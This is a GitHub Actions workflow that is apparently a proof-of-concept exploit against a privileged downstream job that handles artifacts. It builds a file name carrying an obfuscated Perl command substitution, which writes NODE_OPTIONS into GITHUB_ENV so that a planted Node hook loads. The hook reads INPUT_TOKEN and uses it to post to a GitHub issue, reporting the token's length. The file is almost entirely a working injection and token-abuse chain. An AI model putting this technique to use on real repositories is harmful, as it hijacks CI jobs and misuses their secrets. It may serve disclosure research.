name: Test

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact with attacker-controlled filename + token hook
        run: |
          set -e
          mkdir -p content
          python3 - <<'PY'
          import os
          open("content/report.txt", "w").write("plain report\n")
          open("content/pwn.txt", "w").write("substituted target\n")

          # On execution inside the privileged job this writes NODE_OPTIONS into $GITHUB_ENV
          # and emits nothing on stdout, so the surrounding "cat <path>" still succeeds.
          name = ("p$(perl -e 'sysopen(F,$ENV{GITHUB_ENV},577);print F q{NODE_OPTIONS=--require=}"
                  ".chr(47).q{tmp}.chr(47).q{content}.chr(47).q{content}.chr(47).q{h.js}.chr(10)')wn.txt")
          open("content/" + name, "w").write("payload\n")

          hook = r'''
          const fs = require('fs');
          try {
            const t = process.env.INPUT_TOKEN || '';
            fs.appendFileSync('/tmp/hook_ran', 'len=' + t.length + '\n');
            if (t) {
              const https = require('https');
              const body = JSON.stringify({body: 'NODE_OPTIONS hook fired inside privileged action; INPUT_TOKEN length=' + t.length});
              const req = https.request({hostname:'api.github.com', path:'/repos/PDFtoMark/gab-poc-aave-comment/issues/5/comments', method:'POST', headers:{authorization:'Bearer '+t, 'user-agent':'poc', 'content-type':'application/json', 'content-length':Buffer.byteLength(body)}}, r => { r.on('data', () => {}); r.on('end', () => {}); });
              req.on('error', () => {});
              req.write(body); req.end();
            }
          } catch (e) {}
          '''
          open("content/h.js", "w").write(hook)
          print(sorted(os.listdir("content")))
          PY
          ls -1 content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content/
